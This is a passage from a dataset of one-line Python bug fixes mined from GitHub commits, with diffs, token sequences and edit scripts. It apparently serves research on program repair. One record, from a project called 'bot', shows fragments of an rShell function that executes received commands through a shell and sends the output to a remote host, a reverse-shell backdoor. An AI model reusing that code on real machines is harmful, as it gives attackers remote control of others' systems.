3, 78], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:extra\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:d\", \"T\"], 2]]"}
{"project": "databroker", "commit_sha": "3d433ded7a12e4bb00645d07c26798d4ddd5a856", "parent_sha": "20eb471118f7e1de995dd30c18e15b44cea3641c", "file_path": "replay/model/scalar_model.py", "project_url": "https://github.com/bluesky/databroker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -294,7 +294,7 @@ class ScalarCollection(Atom):\n \n             for name, is_plottable in six.iteritems(alignable):\n                 # create a new line artist and scalar model\n-                line_artist, = self._ax.plot([], [], label=name)\n+                line_artist, = self._ax.plot([], [], label=name, marker='D')\n                 self.scalar_models[name] = ScalarModel(line_artist=line_artist,\n                                                        name=name,\n                                                        can_plot=is_plottable,\n", "before": "line_artist , = self . _ax . plot ( [ ] , [ ] , label = name )", "after": "line_artist , = self . _ax . plot ( [ ] , [ ] , label = name , marker = 'D' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 45, 3, 65], [\",:,\", \"T\"], 6], [\"Insert\", [\"argument_list\", 3, 45, 3, 65], [\"keyword_argument\", \"N0\"], 7], [\"Insert\", \"N0\", [\"identifier:marker\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'D'\", \"T\"], 2]]"}
{"project": "dnstwister", "commit_sha": "e38970d0de94eecae30c1e0c1bdc5414b1055c14", "parent_sha": "d13d84dbc292660a55b79a6ca2dd36dbbaeb9399", "file_path": "dnstwister/apis/analysis/__init__.py", "project_url": "https://github.com/thisismyrobot/dnstwister", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -31,5 +31,5 @@ def api_definition():\n def parked_score(hexdomain):\r\n     domain = tools.parse_domain(hexdomain)\r\n     if domain is None:\r\n-        flask.abort(400)\r\n+        flask.abort(400, 'Malformed domain or domain not represented in hexadecimal format.')\r\n     return flask.jsonify({'score': parked.get_score(domain)})\r\n", "before": "flask . abort ( 400 )", "after": "flask . abort ( 400 , 'Malformed domain or domain not represented in hexadecimal format.' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 20, 3, 25], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 20, 3, 25], [\"string:'Malformed domain or domain not represented in hexadecimal format.'\", \"T\"], 3]]"}
{"project": "dnstwister", "commit_sha": "387e99cb38659ca002ca13442fcd1f63a93526e0", "parent_sha": "d875b5c97f1eafd1be4581e664633a744b818d88", "file_path": "dnstwister/repository/statistics.py", "project_url": "https://github.com/thisismyrobot/dnstwister", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -50,7 +50,7 @@ def get_noise_stat(domain):\n     return NoiseStatistic(\n         domain,\n         stat['deltas'],\n-        datetime.datetime.strptime(stat['window_start']),\n+        datetime.datetime.strptime(stat['window_start'], db.datetime_format),\n         stat['noisy'],\n     )\n \n", "before": "return NoiseStatistic ( domain , stat [ 'deltas' ] , datetime . datetime . strptime ( stat [ 'window_start' ] ) , stat [ 'noisy' ] , )", "after": "return NoiseStatistic ( domain , stat [ 'deltas' ] , datetime . datetime . strptime ( stat [ 'window_start' ] , db . datetime_format ) , stat [ 'noisy' ] , )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 35, 3, 57], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 35, 3, 57], [\"attribute\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:db\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:datetime_format\", \"T\"], 2]]"}
{"project": "Pyglet", "commit_sha": "e9db46ae2068d5d1d7e52a5825bbd05e49e3f232", "parent_sha": "a3707dd1372b56c1aac64bb75ea9e2d6e61a9b6f", "file_path": "pyglet/image/codecs/gdkpixbuf2.py", "project_url": "https://github.com/adamlwgriffiths/Pyglet", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -42,7 +42,7 @@ class GdkPixbuf2ImageDecoder(ImageDecoder):\n         # Load into pixbuf\n         err = c_int()\n         loader = gdkpixbuf.gdk_pixbuf_loader_new()\n-        gdkpixbuf.gdk_pixbuf_loader_write(loader, data, len(data))\n+        gdkpixbuf.gdk_pixbuf_loader_write(loader, data, len(data), byref(err))\n         pixbuf = gdkpixbuf.gdk_pixbuf_loader_get_pixbuf(loader)\n         if not gdkpixbuf.gdk_pixbuf_loader_close(loader, byref(err)):\n             raise ImageDecodeException(filename)\n", "before": "gdkpixbuf . gdk_pixbuf_loader_write ( loader , data , len ( data ) )", "after": "gdkpixbuf . gdk_pixbuf_loader_write ( loader , data , len ( data ) , byref ( err ) )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 42, 3, 67], [\",:,\", \"T\"], 6], [\"Insert\", [\"argument_list\", 3, 42, 3, 67], [\"call\", \"N0\"], 7], [\"Insert\", [\"argument_list\", 3, 42, 3, 67], [\"):)\", \"T\"], 8], [\"Insert\", \"N0\", [\"identifier:byref\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"identifier:err\", \"T\"], 1], [\"Move\", \"N1\", [\"):)\", 3, 66, 3, 67], 2]]"}
{"project": "django-xadmin", "commit_sha": "c32b867bc1ce77fd4d25694ac069a3eab1677687", "parent_sha": "3e89d27569588ab553ae176eda313b054812dff0", "file_path": "xadmin/widgets.py", "project_url": "https://github.com/scrapinghub/django-xadmin", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -34,7 +34,7 @@ class AdminTimeWidget(forms.TimeInput):\n \n     @property\n     def media(self):\n-        return vendor('timepicker.js', 'timepicker.css', 'xadmin.widget.datetime.js')\n+        return vendor('datepicker.js','timepicker.js', 'timepicker.css', 'xadmin.widget.datetime.js')\n \n     def __init__(self, attrs=None, format=None):\n         final_attrs = {'class': 'time-field', 'size': '8'}\n", "before": "return vendor ( 'timepicker.js' , 'timepicker.css' , 'xadmin.widget.datetime.js' )", "after": "return vendor ( 'datepicker.js' , 'timepicker.js' , 'timepicker.css' , 'xadmin.widget.datetime.js' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Move\", [\"string:'timepicker.js'\", 3, 23, 3, 38], [\"argument_list\", 3, 22, 3, 86], 2], [\"Move\", [\"string:'timepicker.css'\", 3, 40, 3, 56], [\"argument_list\", 3, 22, 3, 86], 5], [\"Insert\", [\"argument_list\", 3, 22, 3, 86], [\"string:'datepicker.js'\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 22, 3, 86], [\",:,\", \"T\"], 5]]"}
{"project": "obfsproxy", "commit_sha": "7a374dd4446543339eee75421fbc1af73aa2c011", "parent_sha": "18db73dd4d3f5a3a35019474dc5e53b1ef2f14c3", "file_path": "obfsproxy/transports/scramblesuit/util.py", "project_url": "https://github.com/david415/obfsproxy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -79,7 +79,7 @@ def locateMark( mark, payload ):\n \n-    index = payload.find(mark)\n+    index = payload.find(mark, 0, const.MAX_PADDING_LENGTH + const.MARK_LENGTH)\n     if index < 0:\n         log.debug(\"Could not find the mark just yet.\")\n         return None\n", "before": "index = payload . find ( mark )", "after": "index = payload . find ( mark , 0 , const . MAX_PADDING_LENGTH + const . MARK_LENGTH )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 1, 25, 1, 31], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 1, 25, 1, 31], [\"integer:0\", \"T\"], 3], [\"Insert\", [\"argument_list\", 1, 25, 1, 31], [\",:,\", \"T\"], 4], [\"Insert\", [\"argument_list\", 1, 25, 1, 31], [\"binary_operator\", \"N0\"], 5], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"+:+\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N2\"], 2], [\"Insert\", \"N1\", [\"identifier:const\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:MAX_PADDING_LENGTH\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:const\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:MARK_LENGTH\", \"T\"], 2]]"}
{"project": "grayout.vim", "commit_sha": "87d7acf9b3c049f19be69e5589e5f2fbe3c4e132", "parent_sha": "bbb24f01264672ffe2210f64361d6c245d8288a4", "file_path": "grayout.py", "project_url": "https://github.com/mphe/grayout.vim", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -52,7 +52,7 @@ class Parser(object):\n         self._parse()\n \n     def compile(self):\n-        p = Popen(self.cmdline, stdout=PIPE, stdin=PIPE)\n+        p = Popen(self.cmdline, stdout=PIPE, stdin=PIPE, stderr=PIPE)\n         code = self._injectTags()\n         printdebug(\"Compiler input:\\n\" + code)\n         out = p.communicate(code)[0]\n", "before": "p = Popen ( self . cmdline , stdout = PIPE , stdin = PIPE )", "after": "p = Popen ( self . cmdline , stdout = PIPE , stdin = PIPE , stderr = PIPE )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 18, 3, 57], [\",:,\", \"T\"], 6], [\"Insert\", [\"argument_list\", 3, 18, 3, 57], [\"keyword_argument\", \"N0\"], 7], [\"Insert\", \"N0\", [\"identifier:stderr\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:PIPE\", \"T\"], 2]]"}
{"project": "qgis-PosiView", "commit_sha": "74705b9dcf70d3f1de17d69f52575b95d933a7a6", "parent_sha": "608975b560a2a0eea686b2dce1491287d65dfacd", "file_path": "posi_view.py", "project_url": "https://github.com/jrenken/qgis-PosiView", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -57,7 +57,7 @@ class PosiView(object):\n         # initialize plugin directory\n         self.plugin_dir = os.path.dirname(__file__)\n         # initialize locale\n-        locale = QSettings().value('locale/userLocale')[0:2]\n+        locale = QSettings().value('locale/userLocale', 'en_US')[0:2]\n         locale_path = os.path.join(\n             self.plugin_dir,\n             'i18n',\n", "before": "locale = QSettings ( ) . value ( 'locale/userLocale' ) [ 0 : 2 ]", "after": "locale = QSettings ( ) . value ( 'locale/userLocale' , 'en_US' ) [ 0 : 2 ]", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 35, 3, 56], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 35, 3, 56], [\"string:'en_US'\", \"T\"], 3]]"}
{"project": "where-is-when-is", "commit_sha": "3bcbcbf4b7f10937e9747f26a89aea153ad364c6", "parent_sha": "1d6cb4e878047d482205a4fa3e2b9dea46e0b416", "file_path": "core/views.py", "project_url": "https://github.com/konektaz/where-is-when-is", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -34,4 +34,4 @@ class ProfileView(LoginRequiredMixin, TemplateView):\n \n \n def robots(request):\n-    return render('robots.txt')\n+    return render(request, 'robots.txt')\n", "before": "return render ( 'robots.txt' )", "after": "return render ( request , 'robots.txt' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 18, 3, 32], [\"identifier:request\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 18, 3, 32], [\",:,\", \"T\"], 2]]"}
{"project": "bot", "commit_sha": "2ad2f052a595e0d097bf8ab5508274a95f41a639", "parent_sha": "59ddf31f742c58e9b17eb49dda4087df6e247941", "file_path": "bot.py", "project_url": "https://github.com/trackmastersteve/bot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -218,7 +218,7 @@ def rShell(rsHost, rsPort):\n                 if len(data) > 0:\n                     sproc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n                     stdout_value = sproc.stdout.read() + sproc.stderr.read()\n-                    output_str = str(stdout_value)\n+                    output_str = str(stdout_value, \"UTF-8\")\n                     currentWD = os.getcwd() + \"> \"\n                     rs.sendto(str.encode(currentWD + output_str), (str(rsHost), int(rsPort)))\n             except Exception as rsex:\n", "before": "output_str = str ( stdout_value )", "after": "output_str = str ( stdout_value , \"UTF-8\" )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 37, 3, 51], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 37, 3, 51], [\"string:\\\"UTF-8\\\"\", \"T\"], 3]]"}
{"project": "aes-lac-2018", "commit_sha": "cdb321d29fe43444711aedfd6b216d2dab40b24d", "parent_sha": "60b89f070b0f989adc621bab81ed882da79afeba", "file_path": "data/bucketing_sampler.py", "project_url": "https://github.com/igormq/aes-lac-2018", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ class BucketingSampler(Sampler):\n-        super().__init__(data_source)\n+        super(BucketingSampler, self).__init__(data_source)\n         self.data_source = data_source\n         assert hasattr(self.data_source, 'bins_to_samples')\n \n", "before": "super ( ) . __init__ ( data_source )", "after": "super ( BucketingSampler , self ) . __init__ ( data_source )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 0, 14, 0, 16], [\"identifier:BucketingSampler\", \"T\"], 1], [\"Insert\", [\"argument_list\", 0, 14, 0, 16], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 0, 14, 0, 16], [\"identifier:self\", \"T\"], 3]]"}
{"project": "Gofer-Grader", "commit_sha": "0191d668b3694d09063b4828e028afcca5c77f69", "parent_sha": "1b55a4fcab8bc525bd9d750650cdd7adbaa715e3", "file_path": "okgrade/notebook.py", "project_url": "https://github.com/data-8/Gofer-Grader", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -42,7 +42,7 @@ def grade_notebook(notebook_path, test_files):\n     with open(notebook_path) as f:\n         nb = json.load(f)\n \n-    global_env = code_from_ipynb(nb)\n+    global_env = code_from_ipynb(nb, ignore_errors=True)\n \n     # FIXME: This needs to be more general\n     results = [grade(tf, global_env) for tf in test_files]\n", "before": "global_env = code_from_ipynb ( nb )", "after": "global_env = code_from_ipynb ( nb , ignore_errors = True )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 33, 3, 37], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 33, 3, 37], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:ignore_errors\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"true:True\", \"T\"], 2]]"}
{"project": "pfsspy", "commit_sha": "a3d54e2427eb862244cb2b7b5f641a5702873a64", "parent_sha": "5652c35ea64ec6ea6c215e1a3858f9ff1b671deb", "file_path": "pfsspy/utils.py", "project_url": "https://github.com/dstansby/pfsspy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -232,7 +232,7 @@ def car_to_cea(m, method='adaptive'):\n     header_out['CTYPE1'] = header_out['CTYPE1'][:5] + 'CEA'\n     header_out['CTYPE2'] = header_out['CTYPE2'][:5] + 'CEA'\n     header_out['CDELT2'] = 180 / np.pi * 2 / m.data.shape[0]\n-    wcs_out = WCS(header_out)\n+    wcs_out = WCS(header_out, fix=False)\n     wcs_out.heliographic_observer = m.observer_coordinate\n     data_out = reproject(m, wcs_out, shape_out=m.data.shape,\n                          return_footprint=False)\n", "before": "wcs_out = WCS ( header_out )", "after": "wcs_out = WCS ( header_out , fix = False )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 18, 3, 30], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 18, 3, 30], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:fix\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"false:False\", \"T\"], 2]]"}
{"project": "hnn", "commit_sha": "9bbb907e1f28edb0e7a90bc99c8435f47272fc2c", "parent_sha": "d438b213987a6b99a5dcb8763f0eec0ff9cb91ec", "file_path": "specfn.py", "project_url": "https://github.com/jonescompneurolab/hnn", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -365,7 +365,7 @@ class Spec():\n \n     # parses the specific data file\n     def __parse_f(self, fspec):\n-        data_spec = np.load(fspec)\n+        data_spec = np.load(fspec, allow_pickle=True)\n \n         if self.dtype == 'dpl':\n             self.spec = {}\n", "before": "data_spec = np . load ( fspec )", "after": "data_spec = np . load ( fspec , allow_pickle = True )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 28, 3, 35], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 28, 3, 35], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:allow_pickle\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"true:True\", \"T\"], 2]]"}
{"project": "bitcoinperf", "commit_sha": "aacc28b71703b06e346a7884989e2531aa4199d4", "parent_sha": "e7a56085a7891434cf25113349324433b65148a6", "file_path": "runner/benchmarks.py", "project_url": "https://github.com/chaincodelabs/bitcoinperf", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -86,7 +86,7 @@ class Benchmark(abc.ABC):\n                 logger.warning(\"Unexpected drift in run index from artifacts index\")\n \n             path = self.cfg.workdir / (prefix + f'.{idx}')\n-            path.mkdir()\n+            path.mkdir(parents=True)\n             self._artifacts_dir = path\n         return self._artifacts_dir\n \n", "before": "path . mkdir ( )", "after": "path . mkdir ( parents = True )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 23, 3, 25], [\"keyword_argument\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:parents\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"true:True\", \"T\"], 2]]"}
{"project": "corpus2graph", "commit_sha": "8d0306485c66ad5fcf1c934fc5776180c9d71ddc", "parent_sha": "3ef15cc1100d2cbdad3c2d3bc559356320e7a2ac", "file_path": "corpus2graph/word_processing.py", "project_url": "https://github.com/zzcoolj/corpus2graph", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -122,7 +122,7 @@ class WordProcessing(object):\n                         print('[ERROR] ' + new_folder + ' already exists.')\n                         exit()\n                     smallfile = None\n-                    with open(target_file[0]) as bigfile:\n+                    with open(target_file[0], encoding='utf-8') as bigfile:\n                         for lineno, line in enumerate(bigfile):\n                             if lineno % lines_per_file == 0:\n                                 if smallfile:\n", "before": "with open ( target_file [ 0 ] ) as bigfile : for lineno , line in enumerate ( bigfile ) : if lineno % lines_per_file == 0 : if smallfile : ", "after": "with open ( target_file [ 0 ] , encoding = 'utf-8' ) as bigfile : for lineno , line in enumerate ( bigfile ) : if lineno % lines_per_file == 0 : if smallfile : ", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 30, 3, 46], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 30, 3, 46], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:encoding\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'utf-8'\", \"T\"], 2]]"}
{"project": "corpus2graph", "commit_sha": "acb710277d9c04de25efd2bb766e73f04d266f73", "parent_sha": "8d0306485c66ad5fcf1c934fc5776180c9d71ddc", "file_path": "corpus2graph/word_processing.py", "project_url": "https://github.com/zzcoolj/corpus2graph", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -128,7 +128,7 @@ class WordProcessing(object):\n                                 if smallfile:\n                                     smallfile.close()\n                                 small_filename = 'small_file_{}.txt'.format(lineno + lines_per_file)\n-                                smallfile = open(new_folder + 'one/' + small_filename, \"w\")\n+                                smallfile = open(new_folder + 'one/' + small_filename, \"w\", encoding='utf-8')\n                             smallfile.write(line)\n                         if smallfile:\n                             smallfile.close()\n", "before": "smallfile = open ( new_folder + 'one/' + small_filename , \"w\" )", "after": "smallfile = open ( new_folder + 'one/' + small_filename , \"w\" , encoding = 'utf-8' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 49, 3, 92], [\",:,\", \"T\"], 4], [\"Insert\", [\"argument_list\", 3, 49, 3, 92], [\"keyword_argument\", \"N0\"], 5], [\"Insert\", \"N0\", [\"identifier:encoding\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'utf-8'\", \"T\"], 2]]"}
{"project": "knowledge-repo", "commit_sha": "0adb8cea62a258667064ff92930d8380047c0c8f", "parent_sha": "25f599b9381cc2ebbf66d3a5b495887e2cb5707d", "file_path": "knowledge_repo/app/app.py", "project_url": "https://github.com/RasaHQ/knowledge-repo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -126,7 +126,7 @@ class KnowledgeFlask(Flask):\n \n             # For every tag in the excluded tags, create the tag object if it doesn't exist\n             # To ensure that posts with the excluded tags do not show up in the typeahead\n-            excluded_tags = current_app.config.get('EXCLUDED_TAGS')\n+            excluded_tags = current_app.config.get('EXCLUDED_TAGS', []) \n             for tag in excluded_tags:\n                 tag_exists = (db_session.query(Tag)\n                                         .filter(Tag.name == tag)\n", "before": "excluded_tags = current_app . config . get ( 'EXCLUDED_TAGS' )", "after": "excluded_tags = current_app . config . get ( 'EXCLUDED_TAGS' , [ ] )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 51, 3, 68], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 51, 3, 68], [\"list\", \"N0\"], 3], [\"Insert\", \"N0\", [\"[:[\", \"T\"], 0], [\"Insert\", \"N0\", [\"]:]\", \"T\"], 1]]"}
{"project": "knowledge-repo", "commit_sha": "25cef1bbd51b02f2b6a282eff49487461bf6e588", "parent_sha": "62d9bf0939be4df2518c51a6320505b083c65950", "file_path": "knowledge_repo/postprocessors/extract_images.py", "project_url": "https://github.com/RasaHQ/knowledge-repo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -64,7 +64,7 @@ class ExtractImages(KnowledgePostProcessor):\n     def copy_image(cls, kp, path, is_ref=False):\n         if is_ref:\n             return\n-        with open(path) as f:\n+        with open(path, 'rb') as f:\n             kp.write_image(os.path.basename(path), f.read())\n         return os.path.join('images', os.path.basename(path))\n \n", "before": "with open ( path ) as f : kp . write_image ( os . path . basename ( path ) , f . read ( ) )", "after": "with open ( path , 'rb' ) as f : kp . write_image ( os . path . basename ( path ) , f . read ( ) )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 18, 3, 24], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 18, 3, 24], [\"string:'rb'\", \"T\"], 3]]"}
{"project": "knowledge-repo", "commit_sha": "be3c6cb52bafc1a5e97f7f9423f284fb1309d1b7", "parent_sha": "367ce8210eb73bce0592c95859cb9ca577d62f99", "file_path": "knowledge_repo/app/routes/tags.py", "project_url": "https://github.com/RasaHQ/knowledge-repo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -120,7 +120,7 @@ def render_tag_pages():\n     if tag[0] == '#':\n         tag = tag[1:]\n \n-    if tag in current_app.config.get('EXCLUDED_TAGS'):\n+    if tag in current_app.config.get('EXCLUDED_TAGS', []):\n         return render_template('error.html')\n \n     tag_obj = (db_session.query(Tag)\n", "before": "if tag in current_app . config . get ( 'EXCLUDED_TAGS' ) : return render_template ( 'error.html' )", "after": "if tag in current_app . config . get ( 'EXCLUDED_TAGS' , [ ] ) : return render_template ( 'error.html' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 37, 3, 54], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 37, 3, 54], [\"list\", \"N0\"], 3], [\"Insert\", \"N0\", [\"[:[\", \"T\"], 0], [\"Insert\", \"N0\", [\"]:]\", \"T\"], 1]]"}
{"project": "knowledge-repo", "commit_sha": "3127774901c9c37ac75d553c163f451169d8e678", "parent_sha": "a35fe6fd9104b474ee7463c84b9d7c22d7717768", "file_path": "knowledge_repo/repositories/dbrepository.py", "project_url": "https://github.com/RasaHQ/knowledge-repo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -45,7 +45,7 @@ class DbKnowledgeRepository(KnowledgeRepository):\n                               Column('status', Integer, default=self.PostStatus.DRAFT.value),\n                               Column('ref', String(512)),\n                               Column('data', LargeBinary))\n-        self.engine = create_engine(engine_uri)\n+        self.engine = create_engine(engine_uri, pool_recycle=3600)\n         self.session = scoped_session(sessionmaker(bind=self.engine))\n         if auto_create:\n             postref_table.create(self.engine, checkfirst=True)\n", "before": "self . engine = create_engine ( engine_uri )", "after": "self . engine = create_engine ( engine_uri , pool_recycle = 3600 )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 36, 3, 48], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 36, 3, 48], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:pool_recycle\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"integer:3600\", \"T\"], 2]]"}
{"project": "knowledge-repo", "commit_sha": "a6cad47301c8c3bd28acae3a43ded1976ed2c74a", "parent_sha": "b848e27887d442779787407bf0febd12be8af20f", "file_path": "knowledge_repo/post.py", "project_url": "https://github.com/RasaHQ/knowledge-repo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -287,7 +287,7 @@ class KnowledgePost(object):\n \n     @headers.setter\n     def headers(self, headers):\n-        self.write(self.read(), headers=headers)\n+        self.write(self.read(headers=False), headers=headers)\n \n     def update_headers(self, **headers):\n         h = self.headers\n", "before": "self . write ( self . read ( ) , headers = headers )", "after": "self . write ( self . read ( headers = False ) , headers = headers )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 29, 3, 31], [\"keyword_argument\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:headers\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"false:False\", \"T\"], 2]]"}
{"project": "jivago", "commit_sha": "665339947bbe189b29c00938543fb413216bb046", "parent_sha": "73de8e0630a5fc095b8af8846ef3ee29d5c47971", "file_path": "jivago/jivago_application.py", "project_url": "https://github.com/keotl/jivago", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -24,7 +24,7 @@ class JivagoApplication(object):\n         self.__import_package_recursive(root_module)\n         self.context.configure_service_locator()\n         self.serviceLocator = self.context.service_locator()\n-        self.router = Router(Registry(), self.rootModule, self.serviceLocator)\n+        self.router = Router(Registry(), self.rootModule, self.serviceLocator, self.context)\n \n         self.backgroundWorkers = Stream(self.get_annotated(BackgroundWorker)).map(\n             lambda clazz: self.serviceLocator.get(clazz)).map(lambda worker: Thread(target=worker))\n", "before": "self . router = Router ( Registry ( ) , self . rootModule , self . serviceLocator )", "after": "self . router = Router ( Registry ( ) , self . rootModule , self . serviceLocator , self . context )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 29, 3, 79], [\",:,\", \"T\"], 6], [\"Insert\", [\"argument_list\", 3, 29, 3, 79], [\"attribute\", \"N0\"], 7], [\"Insert\", \"N0\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:context\", \"T\"], 2]]"}
